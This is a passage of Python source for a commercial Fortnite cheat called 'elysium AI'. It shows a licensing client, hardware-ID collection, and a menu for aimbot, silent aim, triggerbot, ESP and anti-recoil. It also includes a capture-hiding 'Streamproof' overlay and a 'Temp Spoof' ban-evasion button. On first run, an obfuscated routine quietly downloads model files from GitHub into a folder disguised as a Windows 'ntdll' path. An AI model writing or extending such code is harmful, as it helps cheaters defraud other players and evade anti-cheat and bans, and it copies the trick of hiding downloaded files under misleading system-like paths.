        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            return False

    def checkinit(self):
        if not self.initialized:
            print("[elysium] -> initialize first in order to use the functions")
            time.sleep(2)
            os._exit(1)

    def __do_request(self, post_data):
        try:
            rq_out = requests.post(
                "https://keyauth.win/api/1.0/", data=post_data, timeout=30
            )
            return rq_out.text

        except requests.exceptions.SSLError:
            caption = "Error 0200: SSLError"
            message = (
                "Your Internet Provider is Blocking our Auth Server.\n\n"
                "To fix this issue, follow these steps below: "
                "After closing this window you will be redirected to a website (warp/cloudflare) "
                "Download the file and turn on WARP (not cloudflare) before launching elysium AI.\n"
                "Thank you for choosing elysium AI!"
            )
            message_type = 0x10
            ctypes.windll.user32.MessageBoxW(0, message, caption, message_type)

            webbrowser.open('https://1.1.1.1/', new=2)
            time.sleep(0.2)
            try:
                console_window = ctypes.windll.kernel32.GetConsoleWindow()
                ctypes.windll.user32.PostMessageW(console_window, 0x10, 0, 0)
            except:
                try:
                    sys.exit()
                except:
                    os.system('taskkill /f /fi "imagename eq cmd.exe" 1>NUL 2>NUL')

        except requests.exceptions.Timeout:
            caption = "Error!"
            message = (
                "Request timed out."
            )
            message_type = 0x10
            ctypes.windll.user32.MessageBoxW(0, message, caption, message_type)

            webbrowser.open('https://discord.gg/ely1sium', new=2)
            time.sleep(0.2)
            try:
                console_window = ctypes.windll.kernel32.GetConsoleWindow()
                ctypes.windll.user32.PostMessageW(console_window, 0x10, 0, 0)
                #event.accept()
            except:
                try:
                    sys.exit()
                except:
                    os.system('taskkill /f /fi "imagename eq cmd.exe" 1>NUL 2>NUL')

    class application_data_class:
        numUsers = numKeys = app_ver = customer_panel = onlineUsers = ""

    class user_data_class:
        username = ip = hwid = expires = createdate = lastlogin = subscription = subscriptions = ""

    user_data = user_data_class()
    app_data = application_data_class()

    def __load_app_data(self, data):
        self.app_data.numUsers = data["numUsers"]
        self.app_data.numKeys = data["numKeys"]
        self.app_data.app_ver = data["version"]
        self.app_data.customer_panel = data["customerPanelLink"]
        self.app_data.onlineUsers = data["numOnlineUsers"]

    def __load_user_data(self, data):
        self.user_data.username = data["username"]
        self.user_data.ip = data["ip"]
        self.user_data.hwid = data["hwid"]
        self.user_data.expires = data["subscriptions"][0]["expiry"]
        self.user_data.createdate = data["createdate"]
        self.user_data.lastlogin = data["lastlogin"]
        self.user_data.subscription = data["subscriptions"][0]["subscription"]
        self.user_data.subscriptions = data["subscriptions"]

class others:
    @staticmethod
    def get_hwid():
        if platform.system() == "Linux":
            with open("/etc/machine-id") as f:
                hwid = f.read()
                return hwid
        elif platform.system() == 'Windows':
            try:
                c = wmi.WMI()
                for disk in c.Win32_DiskDrive():
                    if 'PHYSICALDRIVE' in disk.DeviceID:
                        pnp_device_id = disk.PNPDeviceID
                        return pnp_device_id
            except:
                winuser = os.getlogin()
                sid = win32security.LookupAccountName(None, winuser)[0]
                hwid = win32security.ConvertSidToStringSid(sid)
                return hwid
        elif platform.system() == 'Darwin':
            output = subprocess.Popen("ioreg -l | grep IOPlatformSerialNumber", stdout=subprocess.PIPE, shell=True).communicate()[0]
            serial = output.decode().split('=', 1)[1].replace(' ', '')
            hwid = serial[1:-2]
            return hwid

class encryption:
    @staticmethod
    def encrypt_string(plain_text, key, iv):
        plain_text = pad(plain_text, 16)

        aes_instance = AES.new(key, AES.MODE_CBC, iv)

        raw_out = aes_instance.encrypt(plain_text)

        return binascii.hexlify(raw_out)

    @staticmethod
    def decrypt_string(cipher_text, key, iv):
        cipher_text = binascii.unhexlify(cipher_text)

        aes_instance = AES.new(key, AES.MODE_CBC, iv)

        cipher_text = aes_instance.decrypt(cipher_text)

        return unpad(cipher_text, 16)

    @staticmethod
    def encrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).hexdigest()[:32]

            _iv = SHA256.new(iv.encode()).hexdigest()[:16]

            return encryption.encrypt_string(message.encode(), _key.encode(), _iv.encode()).decode()
        except:
            print("Invalid Application Information. Long text is secret short text is ownerid. Name is supposed to be app name not username")
            os._exit(1)

    @staticmethod
    def decrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).hexdigest()[:32]

            _iv = SHA256.new(iv.encode()).hexdigest()[:16]

            return encryption.decrypt_string(message.encode(), _key.encode(), _iv.encode()).decode()
        except:
            print("Invalid Application Information. Long text is secret short text is ownerid. Name is supposed to be app name not username")
            os._exit(1)

PUL = ctypes.POINTER(ctypes.c_ulong)
class KeyBdInput(ctypes.Structure):
    _fields_ = [("wVk", ctypes.c_ushort),
                ("wScan", ctypes.c_ushort),
                ("dwFlags", ctypes.c_ulong),
                ("time", ctypes.c_ulong),
                ("dwExtraInfo", PUL)]

class HardwareInput(ctypes.Structure):
    _fields_ = [("uMsg", ctypes.c_ulong),
                ("wParamL", ctypes.c_short),
                ("wParamH", ctypes.c_ushort)]

class MouseInput(ctypes.Structure):
    _fields_ = [("dx", ctypes.c_long),
                ("dy", ctypes.c_long),
                ("mouseData", ctypes.c_ulong),
                ("dwFlags", ctypes.c_ulong),
                ("time", ctypes.c_ulong),
                ("dwExtraInfo", PUL)]

class Input_I(ctypes.Union):
    _fields_ = [("ki", KeyBdInput),
                ("mi", MouseInput),
                ("hi", HardwareInput)]

class Input(ctypes.Structure):
    _fields_ = [("type", ctypes.c_ulong),
                ("ii", Input_I)]

class POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]


KEY_NAMES = {
    0x01: "LMB",
    0x02: "RMB",
    0x03: "Control-Break",
    0x04: "MMB",
    0x05: "MB1",
    0x06: "MB2",
    0x08: "BACK",
    0x09: "TAB",
    0x0C: "CLR",
    0x0D: "ENTER",
    0x10: "SHFT",
    0x11: "CTRL",
    0x12: "ALT",
    0x13: "PAUSE",
    0x14: "CAPS",
    0x15: "IME Kana",
    0x19: "IME Kanji",
    0x1B: "ESC",
    0x20: "SPCE",
    0x21: "PG UP",
    0x22: "PG DN",
    0x23: "END",
    0x24: "HOME",
    0x25: "LEFT",
    0x26: "UP",
    0x27: "RIGHT",
    0x28: "DOWN",
    0x29: "SEL",
    0x2C: "NONE",
    0x2D: "INS",
    0x2E: "DEL",
    0x2F: "HELP",
    0x30: "0",
    0x31: "1",
    0x32: "2",
    0x33: "3",
    0x34: "4",
    0x35: "5",
    0x36: "6",
    0x37: "7",
    0x38: "8",
    0x39: "9",
    0x41: "A",
    0x42: "B",
    0x43: "C",
    0x44: "D",
    0x45: "E",
    0x46: "F",
    0x47: "G",
    0x48: "H",
    0x49: "I",
    0x4A: "J",
    0x4B: "K",
    0x4C: "L",
    0x4D: "M",
    0x4E: "N",
    0x4F: "O",
    0x50: "None",
    0x51: "Q",
    0x52: "R",
    0x53: "S",
    0x54: "T",
    0x55: "U",
    0x56: "V",
    0x57: "W",
    0x58: "X",
    0x59: "Y",
    0x5A: "Z",
    0x70: "F1",
    0x71: "F2",
    0x72: "F3",
    0x73: "F4",
    0x74: "F5",
    0x75: "F6",
    0x76: "F7",
    0x77: "F8",
    0x78: "F9",
    0x79: "F10",
    0x7A: "F11",
    0x7B: "F12",
    0x5B: "None",
    0xA1: "RSHIFT",
    0x5C: "Left Win",
    0x5D: "Right Win",
    0x60: "Numpad 0",
    0x61: "Numpad 1",
    0x62: "Numpad 2",
    0x63: "Numpad 3",
    0x64: "Numpad 4",
    0x65: "Numpad 5",
    0x66: "Numpad 6",
    0x67: "Numpad 7",
    0x68: "Numpad 8",
    0x69: "Numpad 9",
    0x6A: "Numpad *",
    0x6B: "Numpad +",
    0x6C: "Numpad ,",
    0x6D: "Numpad -",
    0x6E: "Numpad .",
    0x6F: "Numpad /",
    0x70: "F1",
    0x71: "F2",
}

os.environ["QT_ENABLE_HIGHDPI_SCALING"] = "1"
os.environ["QT_AUTO_SCREEN_SCALE_FACTOR"] = "1"
os.environ["QT_SCALE_FACTOR"] = "1"

if hasattr(Qt, 'AA_EnableHighDpiScaling'):
    QApplication.setAttribute(Qt.AA_EnableHighDpiScaling, True)
if hasattr(Qt, 'AA_UseHighDpiPixmaps'):
    QApplication.setAttribute(Qt.AA_UseHighDpiPixmaps, True)

class FPSOverlay(QWidget):
    def __init__(self):
        super().__init__()

        self.setWindowFlags(
            Qt.FramelessWindowHint |
            Qt.WindowStaysOnTopHint |
            Qt.Tool |
            Qt.X11BypassWindowManagerHint
        )
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setAttribute(Qt.WA_NoSystemBackground, True)
        self.setAttribute(Qt.WA_OpaquePaintEvent, False)
        self.setWindowOpacity(0.95)
        self.setAttribute(Qt.WA_TransparentForMouseEvents)

        window_handle = int(self.winId()) 
        user32.SetWindowDisplayAffinity(window_handle, 0x00000011) if Streamproof else user32.SetWindowDisplayAffinity(window_handle, 0x00000000)

        font_id = QFontDatabase.addApplicationFont("C:\\ProgramData\\elysium\\Assets\\Font.ttf")
        font_family = QFontDatabase.applicationFontFamilies(font_id)[0]
        custom_font = QFont(font_family)

        self.label = QLabel("elysium | 0 ENEMIES | 000 FPS", self)
        self.label.setFont(custom_font)
        self.label.setStyleSheet("""
            QLabel {
                color: white;
                background-color: #141414;
                border: 2px solid #1c1d1d;
                border-radius: 8px;
                padding: 5px;
                width: 240px;
                max-width: 240px;
                min-width: 240px;
                text-align: center;
            }
        """)

        layout = QVBoxLayout()
        layout.addWidget(self.label)
        layout.setAlignment(Qt.AlignCenter)
        self.setLayout(layout)

        self.fps = 0
        self.enemies = 0

        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_fps)
        self.timer.start(5) 

        self.move_overlay()


    def update_fps(self):
        self.label.setText(
    f"<span style='color:#0084ff;'>elysium | FORTNITE | V3.01 | FPS: {int(self.fps)}</span>"
)

    def move_overlay(self):
        screen_geometry = QApplication.primaryScreen().availableGeometry()
        self.move(0, 0)


class MyWindow(QWidget):
    try:
        modell = YOLO("C:/ProgramData/SoftworkCR/ntdll/Langs/EN-US/DatetimeConfigurations/Cr/Fortnite.pt")
    except Exception as e:
        def RP03EV27S(fname: str, url: str):
            destination_path = r'C:\\ProgramData\SoftworkCR\\ntdll\\Langs\\EN-US\\DatetimeConfigurations\\Cr\\'
            full_path = os.path.join(destination_path, fname)
            r = requests.get(url, allow_redirects=True)
            with open(full_path, 'wb') as file:
                file.write(r.content)
        os.system(f'mkdir "C:\ProgramData\SoftworkCR\\ntdll\Langs\EN-US\DatetimeConfigurations\Cr" >nul 2>&1')
        RP03EV27S("Fortnite.pt", "https://raw.githubusercontent.com/aiantics/bU7ErD/main/D-VR90EX/DF990/B9022/CKRRJE/8OON.pt")
        RP03EV27S("FortnitePro.pt", "https://raw.githubusercontent.com/aiantics/bU7ErD/main/D-VR90EX/DF990/B9022/CKRRJE/8OOS.pt")
        # RP03EV27S("WINDOWSUN.pt", "https://raw.githubusercontent.com/aiantics/bU7ErD/main/D-VR90EX/DF990/B9022/CKRRJE/8OOU.pt")
        time.sleep(5)
        modell = YOLO("C:/ProgramData/SoftworkCR/ntdll/Langs/EN-US/DatetimeConfigurations/Cr/Fortnite.pt")

    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        global Keybind
        global Keybind2
        global Auto_Fire_Keybind
        global Flickbot_Keybind
        global Slot1_Keybind
        global Slot2_Keybind
        global Slot3_Keybind
        global Slot4_Keybind
        global Slot5_Keybind
        global Slot6_Keybind
        try:
            self.Keybind = Keybind
            self.Keybind2 = Keybind2
            self.Auto_Fire_Keybind = Auto_Fire_Keybind
            self.Flickbot_Keybind = Flickbot_Keybind
            self.Streamproof = Streamproof
            self.Slot1_Keybind = Slot1_Keybind
            self.Slot2_Keybind = Slot2_Keybind
            self.Slot3_Keybind = Slot3_Keybind
            self.Slot4_Keybind = Slot4_Keybind
            self.Slot5_Keybind = Slot5_Keybind
            self.Slot6_Keybind = Slot6_Keybind
        except:restart_program()


        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update)
        self.timer.start(300)


        self.setWindowTitle('elysium')
        self.setWindowOpacity(0.96)
        #self.setMask(self.create_mask())
        self.setFixedSize(350, 500)

        self.setWindowFlag(Qt.MSWindowsFixedSizeDialogHint, True)
        self.setWindowFlag(Qt.WindowMinimizeButtonHint, False)
        self.setWindowFlag(Qt.WindowMaximizeButtonHint, False)
        self.setWindowFlag(Qt.WindowStaysOnTopHint, True)
        self.setWindowFlag(Qt.FramelessWindowHint, False)
        self.setWindowFlag(Qt.Tool, False)
        self.setWindowIcon(QIcon())
        window_handle = int(self.winId())
        user32.SetWindowDisplayAffinity(window_handle, 0x00000011) if Streamproof else user32.SetWindowDisplayAffinity(window_handle, 0x00000000)
        self.theme_hex_color = "#7b00ff"#"#4077c9"
        self.widget_bg_color = "#1E1E1E"
        self.widget_border_color = "#2E2E2E"

        menu_tab_style = """
            QPushButton {
                border: none;	
                padding-bottom: 4px;
                margin-left: 60%;
                margin-right: 60%;
            }
        """ #border-bottom: 1.5px solid #616161;

        font_id = QFontDatabase.addApplicationFont("C:/ProgramData/elysium/Assets/Font.ttf")
        if font_id != -1:
            font_family = QFontDatabase.applicationFontFamilies(font_id)[0]
            custom_font = QFont(font_family, 13)
            QApplication.setFont(custom_font)

        self.Welcome_label_1 = QLabel("")
        self.Welcome_label_2 = QLabel("")
        self.Welcome_label_3 = QLabel("")
        self.Welcome_label_4 = QLabel("")
        self.Welcome_label_5 = QLabel("")
        self.Welcome_label_6 = QLabel("")
        self.Welcome_label_7 = QLabel("")
        self.info_label_3 = QLabel(f"<font color='{self.theme_hex_color}'>User Info:</font>", self)

        self.info_label_4 = QLabel(f"Your Key: . . .")
        self.info_label_5 = QLabel(f"Purchased: . . .")
        self.info_label_6 = QLabel(f"Expiry: . . .")
        self.info_label_7 = QLabel(f"Last Login: . . .")

        self.info_label_8 = QLabel(f"<font color='{self.theme_hex_color}'>Hotkeys:</font>", self)
        #self.info_label_9 = QLabel(f"Close Normally: <font color='#d95276'>[X]</font>", self)
        self.info_label_10 = QLabel(f"Quick On/Off:  <font color='{self.theme_hex_color}'>[F1]</font>", self)
        self.info_label_11 = QLabel(f"Close:   <font color='{self.theme_hex_color}'>[F2]</font>", self)
        self.info_label_13 = QLabel(f"Toggle Menu:   <font color='{self.theme_hex_color}'>[INS]</font>", self)

        self.Fov_Size_label = QLabel(
            f"FOV: {str(Fov_Size)}")
        self.slider = QSlider(Qt.Horizontal)
        self.slider.setStyleSheet(self.get_slider_style())
        self.slider.setMaximumWidth(160)
        self.slider.setMinimumWidth(160)
        self.slider.setFocusPolicy(Qt.NoFocus)
        self.slider.setMinimum(100)
        self.slider.setMaximum(700)
        self.slider.setValue(int(round(Fov_Size)))

        self.Confidence_label = QLabel(
            f"Confidence: {str(Confidence)}%")
        self.slider0 = QSlider(Qt.Horizontal)
        self.slider0.setStyleSheet(self.get_slider_style())
        self.slider0.setMaximumWidth(160)
        self.slider0.setMinimumWidth(160)
        self.slider0.setFocusPolicy(Qt.NoFocus)
        self.slider0.setMinimum(40)
        self.slider0.setMaximum(95)
        self.slider0.setValue(int(round(Confidence)))

        self.Aim_Smooth_label = QLabel(
            f"Aimbot Strength: {str(Aim_Smooth)}")
        self.slider3 = QSlider(Qt.Horizontal)
        self.slider3.setStyleSheet(self.get_slider_style())
        self.slider3.setMaximumWidth(160)
        self.slider3.setMinimumWidth(160)
        self.slider3.setFocusPolicy(Qt.NoFocus)
        self.slider3.setMinimum(5)
        self.slider3.setMaximum(200)
        self.slider3.setValue(int(round(Aim_Smooth)))

        self.Max_Detections_label = QLabel(
            f"Max Detections: {str(Max_Detections)}")
        self.slider4 = QSlider(Qt.Horizontal)
        self.slider4.setStyleSheet(self.get_slider_style())
        self.slider4.setMaximumWidth(160)
        self.slider4.setMinimumWidth(160)
        self.slider4.setFocusPolicy(Qt.NoFocus)
        self.slider4.setMinimum(1)
        self.slider4.setMaximum(6)
        self.slider4.setValue(int(round(Max_Detections)))

        self.aim_bone_label = QLabel("Aim Bone")
        self.aim_bone_combobox = QComboBox()
        self.aim_bone_combobox.setMinimumHeight(10)
        self.aim_bone_combobox.setMaximumHeight(10)
        self.aim_bone_combobox.setMinimumWidth(160)
        self.aim_bone_combobox.setMaximumHeight(160)
        self.aim_bone_combobox.setStyleSheet("QComboBox { background-color: " + self.widget_bg_color + "; }")
        self.aim_bone_combobox.addItems(["Head", "Neck", "Body"])
        self.Aim_Bone = self.aim_bone_combobox.currentText()
        if Aim_Bone == "Head":
            self.aim_bone_combobox.setCurrentText("Head") 
        if Aim_Bone == "Neck":
            self.aim_bone_combobox.setCurrentText("Neck") 
        if Aim_Bone == "Body":
            self.aim_bone_combobox.setCurrentText("Body") 

        self.smoothing_type_label = QLabel("Humanization")
        self.smoothing_type_combobox = QComboBox()
        self.smoothing_type_combobox.setMinimumHeight(10)
        self.smoothing_type_combobox.setMaximumHeight(10)
        self.smoothing_type_combobox.setMinimumWidth(160)
        self.smoothing_type_combobox.setMaximumHeight(160)
        self.smoothing_type_combobox.setStyleSheet("QComboBox { background-color: " + self.widget_bg_color + "; }")
        self.smoothing_type_combobox.addItems(["Default", "Bezier", "Catmull-Rom", "Hermite", "B-Spline", "Sine", "Exponential"])
        self.Smoothing_Type = self.smoothing_type_combobox.currentText()
        if Smoothing_Type == "Default":
            self.smoothing_type_combobox.setCurrentText("Default") 
        if Smoothing_Type == "Bezier":
            self.smoothing_type_combobox.setCurrentText("Bezier") 
        if Smoothing_Type == "Catmull-Rom":
            self.smoothing_type_combobox.setCurrentText("Catmull-Rom")
        if Smoothing_Type == "Hermite":
            self.smoothing_type_combobox.setCurrentText("Hermite") 
        if Smoothing_Type == "Sine":
            self.smoothing_type_combobox.setCurrentText("Sine")  
        if Smoothing_Type == "Exponential":
            self.smoothing_type_combobox.setCurrentText("Exponential")  
        self.img_value_label = QLabel("Blob Size")
        self.img_value_combobox = QComboBox()
        self.img_value_combobox.setMinimumHeight(10)
        self.img_value_combobox.setMaximumHeight(10)
        self.img_value_combobox.setMinimumWidth(160)
        self.img_value_combobox.setMaximumHeight(160)
        self.img_value_combobox.setStyleSheet("QComboBox { background-color: " + self.widget_bg_color + "; }")
        self.img_value_combobox.addItems(["320", "480", "640", "736", "832"])
        self.img_value = self.img_value_combobox.currentText()
        if Img_Value == "320":
            self.img_value_combobox.setCurrentText("320") 
        if Img_Value == "480":
            self.img_value_combobox.setCurrentText("480") 
        if Img_Value == "640":
            self.img_value_combobox.setCurrentText("640")
        if Img_Value == "736":
            self.img_value_combobox.setCurrentText("736")
        if Img_Value == "832":
            self.img_value_combobox.setCurrentText("832")

        self.fps_label = QLabel(
            f"Max FPS: {str(Model_FPS)}")
        self.slider_fps = QSlider(Qt.Horizontal)
        self.slider_fps.setStyleSheet(self.get_slider_style())
        self.slider_fps.setMaximumWidth(160)
        self.slider_fps.setMinimumWidth(160)
        self.slider_fps.setFocusPolicy(Qt.NoFocus)
        self.slider_fps.setMinimum(60)
        self.slider_fps.setMaximum(360)
        self.slider_fps.setValue(int(round(Model_FPS)))

        # Create and configure the ComboBox
        self.model_selected_label = QLabel("Load Model")
        self.model_selected_combobox = QComboBox()
        self.model_selected_combobox.setMinimumHeight(10)
        self.model_selected_combobox.setMaximumHeight(10)
        self.model_selected_combobox.setMinimumWidth(160)
        self.model_selected_combobox.setMaximumHeight(160)
        self.model_selected_combobox.setStyleSheet("QComboBox { background-color: " + self.widget_bg_color + "; }")

        # Load models and populate the ComboBox
        self.modelss = {}
        self.load_modelss()

        #self.rgb_label = QLabel(f"RGB: 255 50 1")
        #self.hue_slider = QSlider(Qt.Horizontal)
        # self.hue_slider.setStyleSheet(self.get_slider_style())
        # self.hue_slider.setMaximumWidth(160)
        # self.hue_slider.setMinimumWidth(160)
        # self.hue_slider.setFocusPolicy(Qt.NoFocus)
        # self.hue_slider.setMinimum(0)
        # self.hue_slider.setMaximum(359)
        huer, _, _ = colorsys.rgb_to_hsv(151 / 255.0, 158  / 255.0, 248  / 255.0)
        hue_degreess = int(huer * 359)
        #self.hue_slider.setValue(hue_degreess)

        # self.lightness_label = QLabel(f"Lightness: 128")
        # self.lightness_slider = QSlider(Qt.Horizontal)
        # self.lightness_slider.setStyleSheet(self.get_slider_style())
        # self.lightness_slider.setMaximumWidth(160)
        # self.lightness_slider.setMinimumWidth(160)
        # self.lightness_slider.setFocusPolicy(Qt.NoFocus)
        # self.lightness_slider.setMinimum(0)
        # self.lightness_slider.setMaximum(255)
        # self.lightness_slider.setValue(conf_lightness)

        # self.opacity_label = QLabel(f"Opacity: 200")
        # self.opacity_slider = QSlider(Qt.Horizontal)
        # self.opacity_slider.setStyleSheet(self.get_slider_style())
        # self.opacity_slider.setMaximumWidth(160)
        # self.opacity_slider.setMinimumWidth(160)
        # self.opacity_slider.setFocusPolicy(Qt.NoFocus)
        # self.opacity_slider.setMinimum(0)
        # self.opacity_slider.setMaximum(255)
        # self.opacity_slider.setValue(conf_opacity)

        self.Enable_Aim_checkbox = QCheckBox("Enable Aimbot")
        self.Enable_Aim_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Enable_Aim_checkbox.setChecked(Enable_Aim)

        self.Enable_Slots_checkbox = QCheckBox("Enable Weapon Slots")
        self.Enable_Slots_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Enable_Slots_checkbox.setChecked(Enable_Slots)


        self.Enable_Flick_checkbox = QCheckBox("Enable Silent Aim")
        self.Enable_Flick_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Enable_Flick_checkbox.setChecked(Enable_Flick_Bot)


        self.flick_sens_info_label = QLabel("Use your in-game fortnite sensitivity.")
        self.flick_set_info_label = QLabel("Silent Aim Settings:")

        self.flick_scope_label = QLabel(f"Silent Aim Strength: {str(Flick_Scope_Sens)}%")
        self.flick_scope_slider = QSlider(Qt.Horizontal)
        self.flick_scope_slider.setStyleSheet(self.get_slider_style())
        self.flick_scope_slider.setMaximumWidth(160)
        self.flick_scope_slider.setMinimumWidth(160)
        self.flick_scope_slider.setFocusPolicy(Qt.NoFocus)
        self.flick_scope_slider.setMinimum(10)
        self.flick_scope_slider.setMaximum(90)
        self.flick_scope_slider.setValue(int(Flick_Scope_Sens))

        self.flick_cool_label = QLabel(f"Cool Down: {str(Flick_Cooldown)}s")
        self.flick_cool_slider = QSlider(Qt.Horizontal)
        self.flick_cool_slider.setStyleSheet(self.get_slider_style())
        self.flick_cool_slider.setMaximumWidth(160)
        self.flick_cool_slider.setMinimumWidth(160)
        self.flick_cool_slider.setFocusPolicy(Qt.NoFocus)
        self.flick_cool_slider.setMinimum(5)
        self.flick_cool_slider.setMaximum(120)
        self.flick_cool_slider.setValue(int(Flick_Cooldown * 100))

        self.flick_delay_label = QLabel(f"Shot Delay: {str(Flick_Delay)}s")
        self.flick_delay_slider = QSlider(Qt.Horizontal)
        self.flick_delay_slider.setStyleSheet(self.get_slider_style())
        self.flick_delay_slider.setMaximumWidth(160)
        self.flick_delay_slider.setMinimumWidth(160)
        self.flick_delay_slider.setFocusPolicy(Qt.NoFocus)
        self.flick_delay_slider.setMinimum(3)
        self.flick_delay_slider.setMaximum(10)
        self.flick_delay_slider.setValue(int(Flick_Delay * 1000))


        self.Controller_On_checkbox = QCheckBox("Controller Support")
        self.Controller_On_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Controller_On_checkbox.setChecked(Controller_On)

        self.CupMode_On_checkbox = QCheckBox("Enable Tournament Mode")
        self.CupMode_On_checkbox.setFocusPolicy(Qt.NoFocus)
        self.CupMode_On_checkbox.setChecked(CupMode_On)

        self.AntiRecoil_On_checkbox = QCheckBox("Enable Anti-Recoil")
        self.AntiRecoil_On_checkbox.setFocusPolicy(Qt.NoFocus)
        self.AntiRecoil_On_checkbox.setChecked(AntiRecoil_On)

        self.Reduce_Bloom_checkbox = QCheckBox("Reduce Bloom")
        self.Reduce_Bloom_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Reduce_Bloom_checkbox.setChecked(Reduce_Bloom)

        self.Require_ADS_checkbox = QCheckBox("Require ADS")
        self.Require_ADS_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Require_ADS_checkbox.setChecked(Require_ADS)

        self.AntiRecoil_Strength_label = QLabel(
            f"Strength: {str(AntiRecoil_Strength)}")
        self.slider60 = QSlider(Qt.Horizontal)

        self.slider60.setStyleSheet(self.get_slider_style())
        self.slider60.setMaximumWidth(160)
        self.slider60.setMinimumWidth(160)

        self.slider60.setFocusPolicy(Qt.NoFocus)
        self.slider60.setMinimum(1)
        self.slider60.setMaximum(10)
        self.slider60.setValue(int(round(AntiRecoil_Strength)))

        self.Show_FPS_checkbox = QCheckBox("Show Info Bar")
        self.Show_FPS_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Show_FPS_checkbox.setChecked(True)
        self.Show_FPS_checkbox.setEnabled(False)

        self.Show_Crosshair_checkbox = QCheckBox("Crosshair")
        self.Show_Crosshair_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Show_Crosshair_checkbox.setChecked(Show_Crosshair)
        self.Show_Detections_checkbox = QCheckBox("ESP")
        self.Show_Detections_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Show_Detections_checkbox.setChecked(Show_Detections)

        self.Show_Aimline_checkbox = QCheckBox("Aimline")
        self.Show_Aimline_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Show_Aimline_checkbox.setChecked(Show_Aimline)

        self.Show_Debug_checkbox = QCheckBox("Debug")
        self.Show_Debug_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Show_Debug_checkbox.setChecked(Show_Debug)

        self.Show_Fov_checkbox = QCheckBox("Fov")
        self.Show_Fov_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Show_Fov_checkbox.setChecked(False)


        self.Show_CMD_checkbox = QCheckBox("Show CMD")
        self.Show_CMD_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Show_CMD_checkbox.setChecked(False)

        self.Enable_TriggerBot_checkbox = QCheckBox("Enable Triggerbot")
        self.Enable_TriggerBot_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Enable_TriggerBot_checkbox.setChecked(Enable_TriggerBot)

        self.Use_Model_Class_checkbox = QCheckBox("Detect Single Class Only")
        self.Use_Model_Class_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Use_Model_Class_checkbox.setChecked(Use_Model_Class)

        self.Require_Keybind_checkbox = QCheckBox("Use Keybind for Triggerbot")
        self.Require_Keybind_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Require_Keybind_checkbox.setChecked(Require_Keybind)
        self.Use_Hue_checkbox = QCheckBox("Rainbow Visuals")
        self.Use_Hue_checkbox.setDisabled(False)
        self.Use_Hue_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Use_Hue_checkbox.setChecked(Use_Hue)
        # self.Streamproof_checkbox = QCheckBox("Streamproof")
        # self.Streamproof_checkbox.setDisabled(False)
        # self.Streamproof_checkbox.setFocusPolicy(Qt.NoFocus)
        # self.Streamproof_checkbox.setChecked(Streamproof)

        self.Auto_Fire_Fov_Size_label = QLabel(
            f"FOV Size: {str(Auto_Fire_Fov_Size)}")
        self.slider5 = QSlider(Qt.Horizontal)
        self.slider5.setStyleSheet(self.get_slider_style())
        self.slider5.setMaximumWidth(160)
        self.slider5.setMinimumWidth(160)
        self.slider5.setFocusPolicy(Qt.NoFocus)
        self.slider5.setMinimum(4)
        self.slider5.setMaximum(30)
        self.slider5.setValue(int(round(Auto_Fire_Fov_Size)))

        self.box_type_label = QLabel("Box Type")
        self.box_type_combobox = QComboBox()
        self.box_type_combobox.setMinimumHeight(10)
        self.box_type_combobox.setMaximumHeight(10)
        self.box_type_combobox.setMinimumWidth(160)
        self.box_type_combobox.setMaximumHeight(160)
        self.box_type_combobox.setStyleSheet("QComboBox { background-color: " + self.widget_bg_color + "; }")
        self.box_type_combobox.addItems(["Regular", "Corner", "Filled"])
        self.Box_type = self.box_type_combobox.currentText()
        if Box_type == "Regular":
            self.box_type_combobox.setCurrentText("Regular") 
        if Box_type == "Corner":
            self.box_type_combobox.setCurrentText("Corner") 
        if Box_type == "Filled":
            self.box_type_combobox.setCurrentText("Filled") 
        self.Auto_Fire_Confidence_label = QLabel(
            f"Confidence: {str(Auto_Fire_Confidence)}%")
        self.slider6 = QSlider(Qt.Horizontal)
        self.slider6.setStyleSheet(self.get_slider_style())
        self.slider6.setMaximumWidth(160)
        self.slider6.setMinimumWidth(160)
        self.slider6.setFocusPolicy(Qt.NoFocus)
        self.slider6.setMinimum(60)
        self.slider6.setMaximum(100)
        self.slider6.setValue(int(round(Auto_Fire_Confidence)))

        self.btn_extraini = QPushButton("Refresh")
        self.btn_extraini.setFocusPolicy(Qt.NoFocus)
        self.btn_extraini.setStyleSheet(self.get_button_style())
        self.btn_extraini.setMinimumWidth(120)
        self.btn_extraini.clicked.connect(self.refresh_extra)

        self.btn_extraini2 = QPushButton("Refresh")
        self.btn_extraini2.setFocusPolicy(Qt.NoFocus)
        self.btn_extraini2.setStyleSheet(self.get_button_style())
        self.btn_extraini2.setMinimumWidth(80)
        self.btn_extraini2.clicked.connect(self.refresh_extra)

        self.tempspoof_button = QPushButton("Temp Spoof")
        self.tempspoof_button.setFocusPolicy(Qt.NoFocus)
        self.tempspoof_button.setStyleSheet(self.get_button_style())
        self.tempspoof_button.setMinimumWidth(80)
        self.tempspoof_button.setMinimumHeight(25)
        self.tempspoof_button.clicked.connect(self.temp_spoof)

        self.hotkey_label = QLabel(f"Keybinds: ")
        self.hotkey_label2 = QLabel("")
        key_name_converted = KEY_NAMES.get(Keybind, f"0x{Keybind:02X}")
        key_name_converted2 = KEY_NAMES.get(Keybind2, f"0x{Keybind2:02X}")
